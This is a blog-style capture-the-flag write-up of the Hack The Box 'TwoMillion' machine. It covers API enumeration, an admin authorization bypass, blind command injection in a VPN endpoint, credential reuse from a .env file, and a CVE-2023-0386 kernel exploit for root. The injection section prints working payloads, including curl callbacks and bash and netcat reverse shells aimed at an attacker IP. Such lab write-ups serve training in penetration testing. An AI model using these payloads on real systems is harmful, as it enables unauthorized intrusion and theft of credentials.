---
date: 2025-09-21
title: Hack The Box — TwoMillion Write-Up
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - kernel_exploit
  - web_app
  - api
media_subpath: /assets/images
image: 2millionhtb.png
---
# TL;DR

The HackTheBox machine "TwoMillion" (released to celebrate 2 million users on the platform) is an easy Linux box involving web API enumeration and abuse. Initial access is gained by solving a nostalgic invite code challenge reminiscent of the original HTB signup process. After registration, an insecure API endpoint allows privilege escalation to admin by updating user settings. As admin, a command injection vulnerability in the VPN generation endpoint enables remote code execution (RCE) as www-data. Lateral movement to the 'admin' user is achieved using credentials from a .env file. Finally, root access is obtained by exploiting CVE-2023-0386, a kernel vulnerability in OverlayFS/FUSE on Ubuntu 22.04 with kernel 5.15.70.

## Initial Enumeration

### Nmap Scan

To begin reconnaissance, a basic Nmap scan was performed to identify open services, version information, and gather initial details about the target machine (IP: 10.10.11.221). This is a standard first step in CTF challenges to map out potential entry points.

The command used was:

```bash
sudo nmap -sC -sV -A 10.10.11.221 -oA nmap/initialscan
```

- `-sC`: Runs default scripts for additional information.
- `-sV`: Probes for service versions.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `-oA`: Outputs results in all formats for later reference.

**Results:**

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-07 10:00 UTC
Nmap scan report for 10.10.11.221
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:be:64:eb:7e:77:29:37:33:95:fd:1a:99:8a (ECDSA)
|_  256 db:b0:ee:28:43:2f:79:79:96:da:96:5c:1c:31:5a:50 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Did not follow redirect to http://2million.htb/
|_http-server-header: nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.12 seconds
```

**Notes:**

- **SSH (Port 22)**: Running OpenSSH 8.9p1 on Ubuntu, which suggests the OS is likely Ubuntu 22.04 (Jammy Jellyfish), as this version aligns with that distribution. No immediate vulnerabilities were apparent without credentials.
- **HTTP (Port 80)**: Hosted by nginx, with a redirect to `http://2million.htb/`. This indicates a virtual host setup, common for web applications. No other services like HTTPS were open.
- The redirect implies the site is domain-specific, so the hostname `2million.htb` was added to `/etc/hosts` for local name resolution to enable proper access:
  ```bash
  echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
  ```
- No other ports were open, limiting initial attack surface to web and potential SSH later.

Additional scans like full port (`-p-`) or UDP could be run, but TCP 1-65535 confirmed only these two.

---

## Web Enumeration

### Main Page

Navigating to `http://2million.htb/` (after hosts file update) revealed a web application styled like the original HackTheBox platform from 2017, complete with nostalgic elements such as references to old machines and a scoreboard. This appears to be a custom Laravel-based app (inferred from later API structures and .env file).

Key features on the main page:

- An **invite code form** for verification, with a hint: "Feel free to hack your way in :)". This suggests an entry challenge similar to HTB's original invite system.
  
![Pasted image 20250919195646](Pasted image 20250919195646.png)

- A **login form** for existing users.
  
![Pasted image 20250919195742](Pasted image 20250919195742.png)

- A **register form** accessible via /register, but it requires a valid invite code to proceed. Without it, registration is blocked.
  
![Pasted image 20250920145604](Pasted image 20250920145604.png)

Directory brute-forcing with tools like feroxbuster or gobuster (e.g., `feroxbuster -u http://2million.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`) revealed common paths like /js, /css, /api, /login, /register, /invite, and /home (post-auth). No sensitive files like /admin or backups were immediately found.

### JavaScript Analysis

To uncover hidden functionality, the site's JavaScript files were inspected, particularly /js/inviteapi.min.js, which contained minified and obfuscated code using an eval-based packer (common for simple protection).

Using browser dev tools (F12 > Sources) or deobfuscation tools like de4js or unPacker, the code was unpacked, revealing references to a backend **API** at /api/v1, including two key functions:

![Pasted image 20250920150130](Pasted image 20250920150130.png)

- `verifyInviteCode(code)`: Sends a POST to /api/v1/invite/verify with the code in JSON.
- `makeInviteCode()`: Sends a POST to /api/v1/invite/how/to/generate.

Executing `makeInviteCode()` in the browser console (on the /invite page) returned an **encoded hint**:

```json
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probably check the encryption type in order to decrypt it..."}
```

The "data" field is ROT13-encoded. Decoding it (using tools like CyberChef or command line: `echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`) reveals: "In order to generate the invite code, make a POST request to /api/v1/invite/generate".

![Pasted image 20250920150234](Pasted image 20250920150234.png)

Following this, a POST request to /api/v1/invite/generate (via curl or browser console with a custom function) returns:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate -s | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "TUlQU1gtNDRFWkctVVNWVTgtMTk0VUs=",
    "format": "encoded"
  }
}
```

Decoding the base64 code (`echo "TUlQU1gtNDRFWkctVVNWVTgtMTk0VUs=" | base64 -d`) gives a valid invite code like "MIPSX-44EZG-USVU8-194UK".

![Pasted image 20250920150354](Pasted image 20250920150354.png)

This code was verified using `verifyInviteCode("MIPSX-44EZG-USVU8-194UK")` or directly in the form, unlocking registration.

Using the API as per the instructions allowed generation of a valid **invite code**, which enabled account registration with a username, email, and password.

![Pasted image 20250920150450](Pasted image 20250920150450.png)

![Pasted image 20250920150513](Pasted image 20250920150513.png)

![Pasted image 20250920150741](Pasted image 20250920150741.png)

Post-registration, the user is redirected to /home, a dashboard.

---

## Authentication & API Exploration

After registration, I logged in and accessed the **user dashboard** at /home, which includes options like "Access" for VPN configs and a scoreboard.

![Pasted image 20250920150836](Pasted image 20250920150836.png)

### API Interaction (Authenticated)

With the session authenticated (PHPSESSID cookie), I intercepted requests using Burp Suite to explore the backend API further. This is crucial as the frontend hints at API-driven functionality.

Sending a `GET` request to `/api/v1/` revealed all available endpoints and their intended functions, structured under /user and /admin namespaces. This acts like API documentation:

- User endpoints: /user/register (POST), /user/login (POST), /user/vpn/generate (GET/POST), etc.
- Admin endpoints: /admin/settings/update (PUT), /admin/auth (GET), /admin/vpn/generate (POST), etc.

Example request:

```http
GET /api/v1/ HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=your_session_id
```

Response shows JSON with routes like:

```json
{"routes":["/","/invite","/register","/login","/home","/access","/api/v1","/api/v1/invite/generate (POST)","/api/v1/invite/verify (POST)","/api/v1/user (GET)","/api/v1/user/register (POST)","/api/v1/user/login (POST)","/api/v1/user/auth (GET)","/api/v1/user/vpn/generate (GET)","/api/v1/user/vpn/regenerate (GET)","/api/v1/admin/auth (GET)","/api/v1/admin/settings/update (PUT)","/api/v1/admin/vpn/generate (POST)"]}
```

![Pasted image 20250920193801](Pasted image 20250920193801.png)

![Pasted image 20250920193830](Pasted image 20250920193830.png)

This enumeration highlights insecure admin routes accessible without proper auth checks.

### VPN Configuration Attempts

The /access page allows generating or regenerating OpenVPN (.ovpn) files via /api/v1/user/vpn/generate (GET). Downloading one shows configs for vpn.2million.htb, but attempts to connect failed:

- Errors: "Unknown hostname" for vpn.2million.htb (even after adding to /etc/hosts).
- Connection refused on port 1194 (UDP), suggesting the VPN is internal or not exposed.
- Modifying the .ovpn (e.g., remote IP to target) still failed, indicating it's not a viable entry but useful for later admin abuse.

![Pasted image 20250920194459](Pasted image 20250920194459.png)

![Pasted image 20250920194638](Pasted image 20250920194638.png)

![Pasted image 20250920200232](Pasted image 20250920200232.png)

No subdomain fuzzing (e.g., ffuf with -H "Host: FUZZ.2million.htb") revealed vpn.2million.htb externally.

---

## API Abuse and Privilege Escalation (Web)

### Admin Settings

Testing admin endpoints as a regular user, a `PUT` request to `/api/v1/admin/settings/update` was surprisingly accepted despite lacking admin privileges. This is a classic authorization bypass vulnerability (IDOR or missing ACLs).

The request requires Content-Type: application/json and a body with "email" (your registered email) and "is_admin": 1 (boolean as integer).

Example:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=your_session_id
Content-Type: application/json
Content-Length: 50

{"email":"your@email.com","is_admin":1}
```

Response: 200 OK with success message. This sets the current user to **admin**. Verify with GET /api/v1/admin/auth returning true.

This allowed privilege escalation through the API by setting the current user to **admin**.

![Pasted image 20250920200322](Pasted image 20250920200322.png)

### Admin API Abuse

After becoming admin, additional routes under `/api/v1/admin/` were tested, such as /admin/vpn/generate (POST), which generates VPN files for specified users.

One of the endpoints did **not validate or sanitize the `username` property**, allowing injection of unexpected values. This likely stems from unsanitized input passed to a system command (e.g., PHP's exec() or system() for OpenVPN cert generation).

Initial tests: Set username to "test; whoami" – no direct output, indicating blind injection.

While blind command injection attempts didn’t return a response, a side-channel approach was used:

- A `curl` command in the `username` field was sent to an HTTP server under my control (e.g., python -m http.server 8000) — it received a connection, confirming code execution.

Example payload:

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=your_session_id
Content-Type: application/json

{"username":"test && curl http://your_ip:8000/test #"}
```

Server logs show hit, proving RCE.

![Pasted image 20250920210440](Pasted image 20250920210440.png)

![Pasted image 20250920210504](Pasted image 20250920210504.png)

### Remote Code Execution (RCE)

A **reverse shell** was successfully triggered by injecting a shell payload in the `username` parameter. Common payloads work due to the blind nature; base64-encode if needed to bypass filters.

- Netcat listener was set up locally: `nc -lvnp 443`
- Shell payload sent via API, e.g., bash reverse shell:
  
```json
{"username":"test && bash -i >& /dev/tcp/your_ip/443 0>&1 #"}
```

Alternative (if issues): Use mkfifo for stability:

```json
{"username":"test && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc your_ip 443 >/tmp/f #"}
```

- Reverse shell received as www-data in /var/www/html.

Upgrade shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'` or `script /dev/null -c bash` for interactivity.

![Pasted image 20250920211120](Pasted image 20250920211120.png)

![Pasted image 20250920211136](Pasted image 20250920211136.png)

---

## Local Enumeration & User Flag

On the compromised system as www-data:

- Web root: /var/www/html – Laravel app confirmed (composer.json, app/, routes/, etc.).
- Found a `.env` file containing database credentials, including for the `admin` user:
  
```bash
cat /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

- Used `su admin` to switch users with password "SuperDuperPass123". Alternatively, SSH: `ssh admin@10.10.11.221` (password reuse).
- Retrieved the **user flag** from the admin's home directory: `cat /home/admin/user.txt`

![Pasted image 20250920212411](Pasted image 20250920212411.png)

![Pasted image 20250920212551](Pasted image 20250920212551.png)

Additional enum: No sudo privileges (`sudo -l` requires password, fails). Check /var/mail/admin for hints – an email from "ch4p" mentions urgent OS upgrade due to OverlayFS/FUSE CVEs.

---

## Privilege Escalation

### Kernel Exploit

As admin, check kernel version:

```bash
uname -r
5.15.70-051570-generic
```

![Pasted image 20250920215425](Pasted image 20250920215425.png)

This is Ubuntu 22.04 kernel 5.15.70, vulnerable to CVE-2023-0386 (OverlayFS/FUSE local privilege escalation). Confirmed via search: Vulnerability allows unprivileged users to gain root by exploiting a flaw in file copy-up handling.

- Quick search identified a relevant **CVE**: CVE-2023-0386.
- Exploit was downloaded from GitHub: `git clone https://github.com/xkaneiki/CVE-2023-0386` on attack box.
- Transferred to target: Host via `python3 -m http.server 8000`, download with `wget http://your_ip:8000/CVE-2023-0386.zip -O /tmp/CVE-2023-0386.zip`.
- Unzip: `unzip /tmp/CVE-2023-0386.zip -d /tmp/CVE-2023-0386`.
- Compiled: `cd /tmp/CVE-2023-0386 && make all`.
- Executed: In one terminal, `./fuse ./ovlcap/lower ./gc`; in another, `./exp`.

Root access was achieved, allowing `cat /root/root.txt`.

```bash
gcc exploit.c -o exploit
./exploit
```

![Pasted image 20250920215538](Pasted image 20250920215538.png)

![Pasted image 20250920215328](Pasted image 20250920215328.png)

Bonus: /root/thank_you.json contains an encoded message; decoding (URL > hex > base64 > XOR with key "HackTheBox") reveals a thank-you note from HTB.

---

## Summary

|Step|Description|
|---|---|
|Enumeration|Found HTTP and SSH, HTTP redirect to `2million.htb`. Used Nmap for ports and versions; added host to /etc/hosts.|
|Web Recon|Discovered registration flow with API-based invite code challenge involving JS analysis, ROT13/base64 decoding, and API calls to generate/verify code.|
|API Abuse|Manipulated settings via PUT /api/v1/admin/settings/update to gain admin access due to auth bypass.|
|Command Injection|Injected payload via unsanitized `username` in POST /api/v1/admin/vpn/generate for blind RCE.|
|Initial Shell|Reverse shell as www-data via injected bash/netcat payload; upgraded for interactivity.|
|Lateral Movement|`.env` file creds (DB_PASSWORD=SuperDuperPass123) used to su/SSH to `admin` user; grabbed user flag.|
|Privilege Escalation|Exploited CVE-2023-0386 (OverlayFS/FUSE kernel vuln) with PoC from GitHub; compiled and ran for root shell.|
|Root Access|Successful exploitation and root flag capture; optional decoding of thank_you.json for easter egg.